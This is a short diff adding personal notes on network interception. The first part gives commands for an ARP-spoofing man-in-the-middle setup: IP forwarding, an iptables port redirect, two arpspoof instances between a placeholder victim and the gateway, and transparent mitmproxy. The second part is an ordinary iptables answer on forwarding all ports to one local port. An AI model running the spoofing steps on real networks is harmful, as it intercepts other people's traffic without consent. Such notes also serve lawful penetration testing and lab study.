@@ -1,0 +1,33 @@
+1, Enable IP forwarding & port redirection
+
+sysctl -w net.ipv4.ip_forward=1
+iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+
+2, Use tmux to run 2 instances of arpspoof:
+
+arpspoof -i $INTERFACE -t $VICTIM_IP $GATEWAY_IP
+arpspoof -i $INTERFACE -t $GATEWAY_IP $VICTIM_IP
+
+3, Run mitmproxy in transparent mode:
+
+mitmproxy -T --host
+
+----------------------------------------------------
+#How to forward all external ports to one local port
+
+Since your polices are ACCEPT, you can use your iptables line with 2 changes:
+
+add destination port range with --dport 1:65535
+change the 127.0.0.1 with your interface IP (the IP of eth0)
+for example, this line works if your eth0 IP is 192.168.1.10:
+
+iptables -A PREROUTING -t nat -i eth0 -p tcp --dport 1:65535 -j DNAT --to-destination 192.168.1.10:10000
+all connections to 192.168.1.10 (to any port) will be redirected to port 10000.
+
+Edit: You can use the REDIRECT target too:
+
+iptables -t nat -A PREROUTING -p tcp --dport 1:65535 -j REDIRECT --to-ports 10000
+this still will not help you if you listen to localhost only.
+
+
+Note: An additional step needed is sysctl -w net.ipv4.conf.eth0.route_localnet=1. You can check the current value with sysctl net.ipv4.conf.eth0.route_localnet
